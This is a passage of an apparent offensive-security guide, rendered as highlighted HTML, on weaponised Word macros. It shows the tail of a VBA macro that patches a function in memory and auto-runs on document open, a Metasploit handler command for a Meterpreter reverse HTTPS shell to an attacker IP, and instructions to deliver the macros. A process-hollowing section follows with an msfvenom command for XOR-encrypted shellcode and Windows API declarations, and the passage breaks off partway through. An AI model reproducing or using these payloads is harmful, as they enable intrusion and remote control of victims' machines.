style="color:#36acaa">105</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">97</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;lize&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token class-name">off</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    temp </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">VirtPro</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name">ByVal</span><span class="token plain"> Func_addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">32</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">64</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> old</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token return-type class-name">patched</span><span class="token plain"> ByVal </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Func_addr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal </span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;&amp;H&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;90&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token return-type class-name">patched</span><span class="token plain"> ByVal </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Func_addr </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal </span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;&amp;H&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;C3&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    temp </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">VirtPro</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name">ByVal</span><span class="token plain"> Func_addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">32</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> old</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Sub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token return-type class-name">Function</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">getPID</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">injProc </span><span class="token class-name">As</span><span class="token plain"> String</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim objServices </span><span class="token class-name">As</span><span class="token plain"> Object</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> objProcessSet </span><span class="token class-name">As</span><span class="token plain"> Object</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> Process As Object</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">Set</span><span class="token plain"> objServices </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">GetObject</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;winmgmts:\\.\root\CIMV2&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">Set</span><span class="token plain"> objProcessSet </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> objServices</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">ExecQuery</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;SELECT ProcessID, name FROM Win32_Process WHERE name = &quot;</span><span class="token plain">&quot;</span><span class="token string" style="color:#e3116c">&quot; &amp; injProc &amp; &quot;</span><span class="token plain">&quot;</span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">48</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    For Each Process In </span><span class="token class-name">objProcessSet</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        getPID </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> Process</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">processID</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Next</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Function</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token return-type class-name">Sub</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">test</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mymacro</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Sub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token return-type class-name">Sub</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Document_Open</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    test</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Sub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token return-type class-name">Sub</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">AutoOpen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    test</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Sub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Start your Metasploit listener</strong></li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> msfconsole </span><span class="token parameter variable" style="color:#36acaa">-q</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-x</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;use multi/handler; set payload windows/meterpreter/reverse_https; set lhost [ATTACKER_IP]; set lport [PORT]; exploit&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Deliver your Macros</strong> and wait for execution and your reverse shell</li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="process-hollow---meterpreter-encrypted"><strong>Process Hollow - Meterpreter Encrypted</strong><a href="#process-hollow---meterpreter-encrypted" class="hash-link" aria-label="Direct link to process-hollow---meterpreter-encrypted" title="Direct link to process-hollow---meterpreter-encrypted" translate="no">​</a></h3>
<ol>
<li class=""><strong>Create your shellcode</strong></li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># If you change the key, then change it in the vba code too</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfvenom </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> windows/meterpreter/reverse_https </span><span class="token assign-left variable" style="color:#36acaa">LHOST</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">LHOST</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">LPORT</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">LPORT</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">EXITFUNC</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">thread </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> vbapplication </span><span class="token parameter variable" style="color:#36acaa">--encrypt</span><span class="token plain"> xor --encrypt-key </span><span class="token string" style="color:#e3116c">&#x27;CHANGEMYKEY&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Create a new file Macros</strong> and insert your shellcode from step above and save the file as a <code>.docm</code>, in this case it will inject into <code>notepad.exe</code> but you can change this</li>
</ol>
<div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token preprocessor property" style="color:#36acaa">#If Win64 Then</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Private Declare PtrSafe Function ZwQueryInformationProcess Lib </span><span class="token string" style="color:#e3116c">&quot;NTDLL&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByVal hProcess </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal procInformationClass </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByRef procInformation </span><span class="token class-name">As</span><span class="token plain"> PROCESS_BASIC_INFORMATION</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal ProcInfoLen </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByRef retlen </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As Long</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Private Declare PtrSafe Function CreateProcessA Lib </span><span class="token string" style="color:#e3116c">&quot;KERNEL32&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByVal lpApplicationName </span><span class="token class-name">As</span><span class="token plain"> String</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal lpCommandLine </span><span class="token class-name">As</span><span class="token plain"> String</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> lpProcessAttributes </span><span class="token class-name">As</span><span class="token plain"> Any</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> lpThreadAttributes </span><span class="token class-name">As</span><span class="token plain"> Any</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal bInheritHandles </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal dwCreationFlags </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal lpEnvironment </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal lpCurrentDirectory </span><span class="token class-name">As</span><span class="token plain"> String</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> lpStartupInfo </span><span class="token class-name">As</span><span class="token plain"> STARTUPINFOA</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> lpProcessInformation </span><span class="token class-name">As</span><span class="token plain"> PROCESS_INFORMATION</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Private Declare PtrSafe Function ReadProcessMemory Lib </span><span class="token string" style="color:#e3116c">&quot;KERNEL32&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByVal hProcess </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal lpBaseAddress </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> lpBuffer </span><span class="token class-name">As</span><span class="token plain"> Any</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal dwSize </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal lpNumberOfBytesRead </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As Long</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Private Declare PtrSafe Function WriteProcessMemory Lib </span><span class="token string" style="color:#e3116c">&quot;KERNEL32&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByVal hProcess </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal lpBaseAddress </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> lpBuffer </span><span class="token class-name">As</span><span class="token plain"> Any</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal nSize </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal lpNumberOfBytesWritten </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As Long</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Private Declare PtrSafe Function ResumeThread Lib </span><span class="token string" style="color:#e3116c">&quot;KERNEL32&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByVal hThread </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As Long</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Private Declare PtrSafe Sub RtlZeroMemory Lib </span><span class="token string" style="color:#e3116c">&quot;KERNEL32&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Destination </span><span class="token class-name">As</span><span class="token plain"> STARTUPINFOA</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal Length </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Private Declare PtrSafe Function GetProcAddress Lib </span><span class="token string" style="color:#e3116c">&quot;KERNEL32&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByVal hModule </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal lpProcName </span><span class="token class-name">As</span><span class="token plain"> String</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Private Declare PtrSafe Function LoadLibraryA Lib </span><span class="token string" style="color:#e3116c">&quot;KERNEL32&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByVal lpLibFileName </span><span class="token class-name">As</span><span class="token plain"> String</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Private Declare PtrSafe Function VirtualProtect Lib </span><span class="token string" style="color:#e3116c">&quot;KERNEL32&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByVal lpAddress </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal dwSize </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal flNewProtect </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByRef lpflOldProtect </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As Long</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Private Declare PtrSafe Function CryptBinaryToStringA Lib </span><span class="token string" style="color:#e3116c">&quot;CRYPT32&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByRef pbBinary </span><span class="token class-name">As</span><span class="token plain"> Any</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal cbBinary </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal dwFlags </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByRef pszString </span><span class="token class-name">As</span><span class="token plain"> Any</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> pcchString </span><span class="token class-name">As</span><span class="token plain"> Any</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As Long</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token preprocessor property" style="color:#36acaa">#Else</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Private Declare Function ZwQueryInformationProcess Lib </span><span class="token string" style="color:#e3116c">&quot;NTDLL&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByVal hProcess </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal procInformationClass </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByRef procInformation </span><span class="token class-name">As</span><span class="token plain"> PROCESS_BASIC_INFORMATION</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal ProcInfoLen </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByRef retlen </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As Long</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Private Declare Function CreateProcessA Lib </span><span class="token string" style="color:#e3116c">&quot;KERNEL32&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByVal lpApplicationName </span><span class="token class-name">As</span><span class="token plain"> String</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal lpCommandLine </span><span class="token class-name">As</span><span class="token plain"> String</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> lpProcessAttributes </span><span class="token class-name">As</span><span class="token plain"> Any</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> lpThreadAttributes </span><span class="token class-name">As</span><span class="token plain"> Any</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal bInheritHandles </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal dwCreationFlags </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal lpEnvironment </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal lpCurrentDirectory </span><span class="token class-name">As</span><span class="token plain"> String</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> lpStartupInfo </span><span class="token class-name">As</span><span class="token plain"> STARTUPINFOA</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> lpProcessInformation </span><span class="token class-name">As</span><span class="token plain"> PROCESS_INFORMATION</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Private Declare Function ReadProcessMemory Lib </span><span class="token string" style="color:#e3116c">&quot;KERNEL32&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByVal hProcess </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal lpBaseAddress </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> lpBuffer </span><span class="token class-name">As</span><span class="token plain"> Any</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal dwSize </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal lpNumberOfBytesRead </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As Long</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Private Declare Function WriteProcessMemory Lib </span><span class="token string" style="color:#e3116c">&quot;KERNEL32&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByVal hProcess </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal lpBaseAddress </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> lpBuffer </span><span class="token class-name">As</span><span class="token plain"> Any</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal nSize </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal lpNumberOfBytesWritten </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As Long</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Private Declare Function ResumeThread Lib </span><span class="token string" style="color:#e3116c">&quot;KERNEL32&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByVal hThread </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As Long</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Private Declare Sub RtlZeroMemory Lib </span><span class="token string" style="color:#e3116c">&quot;KERNEL32&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Destination </span><span class="token class-name">As</span><span class="token plain"> STARTUPINFOA</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal Length </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Private Declare Function GetProcAddress Lib </span><span class="token string" style="color:#e3116c">&quot;KERNEL32&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByVal hModule </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal lpProcName </span><span class="token class-name">As</span><span class="token plain"> String</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Private Declare Function LoadLibraryA Lib </span><span class="token string" style="color:#e3116c">&quot;KERNEL32&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByVal lpLibFileName </span><span class="token class-name">As</span><span class="token plain"> String</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Private Declare Function VirtualProtect Lib </span><span class="token string" style="color:#e3116c">&quot;KERNEL32&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByVal lpAddress </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal dwSize </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal flNewProtect </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByRef lpflOldProtect </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As Long</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Private Declare Function CryptBinaryToStringA Lib </span><span class="token string" style="color:#e3116c">&quot;CRYPT32&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByRef pbBinary </span><span class="token class-name">As</span><span class="token plain"> Any</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal cbBinary </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal dwFlags </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByRef pszString </span><span class="token class-name">As</span><span class="token plain"> Any</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> pcchString </span><span class="token class-name">As</span><span class="token plain"> Any</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As Long</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token preprocessor property" style="color:#36acaa">#End If</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Private Type PROCESS_BASIC_INFORMATION</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Reserved1 As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    PebAddress As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Reserved2 As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Reserved3 As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    UniquePid As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    MoreReserved As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Type</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Private Type STARTUPINFOA</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    cb As Long</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    lpReserved As String</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    lpDesktop As String</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    lpTitle As String</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    dwX As Long</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    dwY As Long</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    dwXSize As Long</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    dwYSize As Long</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    dwXCountChars As Long</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    dwYCountChars As Long</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    dwFillAttribute As Long</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    dwFlags As Long</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    wShowWindow As Integer</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    cbReserved2 As Integer</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    lpReserved2 As String</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    hStdInput As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    hStdOutput As LongPtr</span><br></span><span class="token-line" 